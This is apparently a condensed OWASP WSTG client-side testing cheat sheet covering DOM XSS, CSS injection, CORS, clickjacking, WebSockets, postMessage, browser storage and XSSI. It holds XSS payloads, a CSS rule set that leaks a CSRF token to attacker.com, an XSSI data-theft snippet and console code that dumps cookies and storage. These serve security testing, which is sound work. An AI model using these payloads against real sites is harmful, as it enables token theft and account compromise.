# 4.11 Client-Side Testing (WSTG-CLNT)

Tests for browser-side attacks: DOM XSS, CSS injection, CORS, clickjacking, WebSockets, postMessage, browser storage, XSSI.

---

## WSTG-CLNT-01: DOM XSS
**Sources (inputs to DOM):**
```javascript
document.URL, document.location, document.location.href
document.location.search, document.location.hash
document.referrer, window.name
document.cookie, history.pushState/replaceState
```

**Sinks (dangerous functions):**
```javascript
document.write(), document.writeln()
element.innerHTML, element.outerHTML
eval(), setTimeout(), setInterval(), Function()
element.src, element.href, element.action
location.href = , location.assign()
```

**Payload (in URL fragment):**
```
#<script>alert(1)</script>
#"><img src=x onerror=alert(1)>
#javascript:alert(1)   # when assigned to location
```

---

## WSTG-CLNT-05: CSS Injection
**Payloads:**
```
;-o-link:'javascript:alert(1)';-o-link-source:current;  # Opera
;-:expression(alert(URL=1));                             # IE
```

**CSRF Token Theft via CSS:**
```css
input[name=csrf_token][value^=a] { background: url(http://attacker.com/?a); }
input[name=csrf_token][value^=b] { background: url(http://attacker.com/?b); }
```
Attacker iterates through each character prefix to extract token.

---

## WSTG-CLNT-07: CORS Testing
**Insecure Configurations:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: null
Access-Control-Allow-Origin: [reflected Origin header]
Access-Control-Allow-Credentials: true + Allow-Origin: *  (invalid but worth testing)
```

**Test:** Send request with `Origin: attacker.com`; observe if `Access-Control-Allow-Origin: attacker.com` is reflected.

---

## WSTG-CLNT-09: Clickjacking
**PoC:**
```html
<html><head><title>Clickjack test</title></head>
<body>
<iframe src="http://target.com" width="500" height="500"></iframe>
</body></html>
```

**Defenses to Check:**
- `X-Frame-Options: DENY` or `SAMEORIGIN`
- `Content-Security-Policy: frame-ancestors 'none'`
- Frame-busting JavaScript (can be bypassed via double-framing, sandbox attribute, JS disabled)

---

## WSTG-CLNT-10: WebSockets
**Testing Steps:**
1. Identify `ws://`/`wss://` in source
2. Test without Origin header (server should validate origin)
3. Verify `wss://` (not `ws://`) for sensitive data
4. Replay/fuzz messages via ZAP WebSocket tab
5. Test standard auth/authz with WebSocket messages

---

## WSTG-CLNT-11: Web Messaging (postMessage)
**Vulnerable Origin Check Bypass:**
```javascript
// Vulnerable: indexOf(".owasp.org") → bypass with www.owasp.org.attacker.com
if (e.origin.indexOf(".owasp.org") !== -1) { process(e.data) }
// Fix: use === for exact match
if (e.origin === "https://www.owasp.org") { process(e.data) }
```

**XSS via innerHTML:**
```javascript
// Dangerous:
element.innerHTML = e.data;
// Safe:
element.innerText = e.data;
```

---

## WSTG-CLNT-12: Browser Storage
**Enumerate Storage via Console:**
```javascript
// localStorage
for (let i = 0; i < localStorage.length; i++) console.log(localStorage.key(i), ':', localStorage.getItem(localStorage.key(i)));

// sessionStorage
for (let i = 0; i < sessionStorage.length; i++) console.log(sessionStorage.key(i));

// Cookies
console.log(document.cookie);

// IndexedDB
indexedDB.databases().then(dbs => dbs.forEach(db => {
    const req = indexedDB.open(db.name);
    req.onsuccess = () => Array.from(req.result.objectStoreNames).forEach(s => {
        req.result.transaction(s,'readonly').objectStore(s).getAll().onsuccess = e => console.log(s, e.target.result);
    });
}));
```

**Risk:** Sensitive data (tokens, PII, credentials) should not be in client-side storage.

---

## WSTG-CLNT-13: XSSI (Cross-Site Script Inclusion)
**Attack:** Include victim's JSON/JS endpoint as `<script src>` from attacker's page; override global functions/Array constructor to steal data.

**Leakage Vectors:**
```html
<!-- Global variable theft -->
<script src="https://victim.com/api/user.js"></script>
<script>alert(window.secretApiKey)</script>

<!-- Function override -->
<script>function leakData(data) { sendToAttacker(data); }</script>
<script src="https://victim.com/api.js"></script>
```
